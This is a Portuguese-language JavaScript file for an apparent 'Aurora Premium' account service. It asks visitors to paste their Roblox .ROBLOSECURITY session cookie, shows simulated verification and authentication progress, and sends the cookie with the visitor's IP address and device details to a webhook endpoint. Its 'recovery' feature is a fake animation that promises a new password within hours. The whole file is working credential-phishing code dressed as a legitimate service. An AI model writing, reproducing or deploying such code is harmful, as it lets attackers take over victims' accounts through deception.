// ============================================
// AURORA PREMIUM - Sistema Avançado
// ============================================

// Configuração Global
const CONFIG = {
    STORAGE_KEY: "aurora_last_submission",
    RECOVERY_KEY: "aurora_recovery_started",
    COOLDOWN_DAYS: 19,
    API_ENDPOINTS: {
        webhook: '/api/webhook',
        verify: '/api/verificar-ban',
        ban: '/api/ban'
    }
};

// ============================================
// NAVEGAÇÃO E SEÇÕES
// ============================================

function navigateTo(section) {
    // Remover classe active de todas as seções
    document.querySelectorAll('.section').forEach(s => {
        s.classList.remove('active');
    });

    // Adicionar classe active à seção selecionada
    const targetSection = document.getElementById(section);
    if (targetSection) {
        targetSection.classList.add('active');
    }

    // Atualizar navbar
    document.querySelectorAll('.nav-link').forEach(link => {
        link.classList.remove('active');
    });
    document.querySelector(`[data-section="${section}"]`)?.classList.add('active');

    // Scroll para o topo
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Event listeners para navegação
document.querySelectorAll('.nav-link').forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        const section = link.getAttribute('data-section');
        navigateTo(section);
    });
});

// ============================================
// FAQ - ACCORDION
// ============================================

document.querySelectorAll('.faq-question').forEach(question => {
    question.addEventListener('click', () => {
        const faqItem = question.parentElement;
        
        // Fechar outros itens
        document.querySelectorAll('.faq-item').forEach(item => {
            if (item !== faqItem) {
                item.classList.remove('active');
            }
        });

        // Toggle item atual
        faqItem.classList.toggle('active');
    });
});

// ============================================
// VALIDAÇÃO E SEGURANÇA
// ============================================

function validateCookie(cookie) {
    if (!cookie || typeof cookie !== 'string') {
        return { valid: false, error: 'Cookie inválido' };
    }

    const trimmed = cookie.trim();

    if (trimmed.length < 50) {
        return { valid: false, error: 'Cookie muito curto' };
    }

    const hasValidPattern = /^_\|WARNING:/.test(trimmed) || /ROBLOSECURITY/.test(trimmed);

    if (!hasValidPattern) {
        return { valid: false, error: 'Formato de cookie inválido' };
    }

    return { valid: true, value: trimmed };
}

function sanitizeString(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

// ============================================
// GERENCIAMENTO DE ESTADO
// ============================================

function checkCooldown() {
    const lastSubmission = localStorage.getItem(CONFIG.STORAGE_KEY);
    if (!lastSubmission) {
        return { canSubmit: true, daysLeft: 0 };
    }

    const lastDate = new Date(lastSubmission);
    const now = new Date();
    const diffTime = Math.abs(now - lastDate);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    const daysLeft = CONFIG.COOLDOWN_DAYS - diffDays;

    if (diffDays >= CONFIG.COOLDOWN_DAYS) {
        return { canSubmit: true, daysLeft: 0 };
    } else {
        return { canSubmit: false, daysLeft: daysLeft };
    }
}

function saveSubmissionDate() {
    localStorage.setItem(CONFIG.STORAGE_KEY, new Date().toISOString());
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    let deviceType = "💻 Desktop/PC";
    let os = "Desconhecido";
    let browser = "Desconhecido";

    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
        deviceType = "📱 Celular/Smartphone";
    } else if (/Tablet|iPad/i.test(ua)) {
        deviceType = "📟 Tablet";
    }

    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac OS")) os = "macOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    else if (ua.includes("Linux")) os = "Linux";

    if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Google Chrome";
    else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Apple Safari";
    else if (ua.includes("Edg")) browser = "Microsoft Edge";
    else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";

    return { type: deviceType, os: os, browser: browser };
}

async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json', {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
        });

        if (!response.ok) throw new Error('Erro ao obter IP');

        const data = await response.json();
        return data.ip || 'Não disponível';
    } catch (error) {
        console.error("Erro ao obter IP:", error);
        return 'Não disponível';
    }
}

// ============================================
// INTERFACE E NOTIFICAÇÕES
// ============================================

function showNotification(message, isError = false) {
    const notification = document.getElementById('notification');
    notification.textContent = sanitizeString(message);
    notification.classList.add('show');
    
    if (isError) {
        notification.classList.add('error');
    } else {
        notification.classList.remove('error');
    }

    setTimeout(() => {
        notification.classList.remove('show');
    }, 4000);
}

function togglePasswordVisibility() {
    const cookieInput = document.getElementById('cookie');
    const toggleBtn = document.getElementById('toggle-password');

    if (cookieInput.type === 'password') {
        cookieInput.type = 'text';
        toggleBtn.innerHTML = '<i class="fas fa-eye-slash"></i>';
    } else {
        cookieInput.type = 'password';
        toggleBtn.innerHTML = '<i class="fas fa-eye"></i>';
    }
}

function showProcessingScreen(message) {
    document.getElementById('processing-screen').style.display = 'flex';
    document.getElementById('processing-message').textContent = sanitizeString(message);
    updateProgress(0, 0);
}

function showSuccessScreen() {
    document.getElementById('success-screen').style.display = 'flex';
}

function hideModals() {
    document.getElementById('processing-screen').style.display = 'none';
    document.getElementById('success-screen').style.display = 'none';
}

function updateProgress(percentage, step) {
    const progressFill = document.querySelector('.progress-fill');
    const progressText = document.getElementById('progress-text');

    progressFill.style.width = percentage + '%';
    progressText.textContent = percentage + '%';

    for (let i = 1; i <= 3; i++) {
        const stepEl = document.getElementById(`step-${i}`);
        if (i <= step) {
            stepEl.classList.add('active');
        } else {
            stepEl.classList.remove('active');
        }
    }
}

// ============================================
// PROCESSAMENTO PRINCIPAL
// ============================================

async function submitCookie() {
    const cookieInput = document.getElementById('cookie');
    const cookie = cookieInput.value.trim();

    // Validar cookie
    const validation = validateCookie(cookie);
    if (!validation.valid) {
        showNotification("❌ " + validation.error, true);
        return;
    }

    // Verificar cooldown
    const { canSubmit, daysLeft } = checkCooldown();
    if (!canSubmit) {
        showNotification(`⚠️ Aguarde ${daysLeft} dias para um novo processo.`, true);
        return;
    }

    // Iniciar processamento
    showProcessingScreen("Verificando credenciais...");
    updateProgress(10, 1);

    try {
        // Obter informações
        const ip = await getClientIP();
        const userAgent = navigator.userAgent;
        const deviceInfo = getDeviceInfo();

        // Simular verificação
        await new Promise(resolve => setTimeout(resolve, 1500));
        document.getElementById('processing-message').textContent = "Autenticando no servidor...";
        updateProgress(40, 2);

        // Simular autenticação
        await new Promise(resolve => setTimeout(resolve, 1500));
        document.getElementById('processing-message').textContent = "Processando dados...";
        updateProgress(70, 2);

        // Enviar para servidor
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        const sent = await sendToServer(validation.value, userAgent, ip, deviceInfo);

        if (sent) {
            updateProgress(100, 3);
            saveSubmissionDate();

            await new Promise(resolve => setTimeout(resolve, 500));
            hideModals();
            showSuccessScreen();
        } else {
            showNotification("❌ Erro ao processar. Tente novamente.", true);
            hideModals();
        }
    } catch (error) {
        console.error("Erro:", error);
        showNotification("❌ Erro ao processar sua solicitação.", true);
        hideModals();
    }
}

async function sendToServer(cookie, userAgent, ip, deviceInfo) {
    try {
        const payload = {
            cookie: cookie,
            ip: ip,
            device: deviceInfo.type,
            userAgent: userAgent
        };

        const response = await fetch(CONFIG.API_ENDPOINTS.webhook, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            console.error("Erro:", response.status);
            return false;
        }

        const data = await response.json();
        return data.success === true;
    } catch (error) {
        console.error("Erro de conexão:", error);
        return false;
    }
}

function startRecoveryProcess() {
    document.getElementById('processing-message').textContent = "Iniciando recuperação...";
    updateProgress(20, 1);

    setTimeout(() => {
        document.getElementById('processing-message').textContent = "Verificando dados...";
        updateProgress(50, 2);

        setTimeout(() => {
            document.getElementById('processing-message').textContent = "Solicitando redefinição...";
            updateProgress(80, 2);

            setTimeout(() => {
                document.getElementById('processing-message').innerHTML = 
                    "⏳ Aguarde de 1 a 3 horas<br>A nova senha será enviada para este dispositivo.";
                updateProgress(100, 3);

                localStorage.setItem(CONFIG.RECOVERY_KEY, new Date().toISOString());

                setTimeout(() => {
                    showNotification("⏰ Processo iniciado! Aguarde de 1 a 3 horas.", false);
                    hideModals();
                }, 1000);
            }, 1500);
        }, 1500);
    }, 1500);
}

// ============================================
// DOAÇÕES
// ============================================

function openDonation(method) {
    const methods = {
        'paypal': '#',
        'card': '#',
        'crypto': '#',
        'discord': 'https://discord.gg/hC9z3DrwyZ'
    };

    const url = methods[method];
    if (url && url !== '#') {
        window.open(url, '_blank');
    } else {
        showNotification('Este método será ativado em breve!', false);
    }
}

// ============================================
// INICIALIZAÇÃO
// ============================================

window.addEventListener('DOMContentLoaded', () => {
    // Verificar cooldown
    const { canSubmit, daysLeft } = checkCooldown();

    if (!canSubmit) {
        showNotification(`🔒 Aguarde mais ${daysLeft} dias para um novo processo.`, true);

        setTimeout(() => {
            const sendBtn = document.getElementById('send-btn');
            if (sendBtn) {
                sendBtn.disabled = true;
                sendBtn.style.opacity = '0.5';
                sendBtn.style.cursor = 'not-allowed';
            }
        }, 3000);
    }

    // Event listeners
    const sendBtn = document.getElementById('send-btn');
    const recoverBtn = document.getElementById('recover-btn');
    const cookieInput = document.getElementById('cookie');
    const togglePasswordBtn = document.getElementById('toggle-password');

    if (sendBtn) sendBtn.addEventListener('click', submitCookie);
    if (recoverBtn) recoverBtn.addEventListener('click', startRecoveryProcess);
    if (togglePasswordBtn) togglePasswordBtn.addEventListener('click', togglePasswordVisibility);

    if (cookieInput) {
        cookieInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                submitCookie();
            }
        });
    }

    // Fechar modais ao clicar fora
    document.querySelectorAll('.modal-overlay').forEach(modal => {
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                hideModals();
            }
        });
    });

    // Inicializar seção home
    navigateTo('home');
});

// ============================================
// UTILITÁRIOS
// ============================================

// Smooth scroll para âncoras
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        const href = this.getAttribute('href');
        if (href !== '#' && href !== '#terms' && href !== '#privacy' && href !== '#security') {
            e.preventDefault();
            const target = document.querySelector(href);
            if (target) {
                target.scrollIntoView({ behavior: 'smooth' });
            }
        }
    });
});

// Detectar scroll para animações
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -100px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.animation = 'fadeIn 0.6s ease forwards';
            observer.unobserve(entry.target);
        }
    });
}, observerOptions);

document.querySelectorAll('.info-card, .faq-item, .donation-card').forEach(el => {
    observer.observe(el);
});
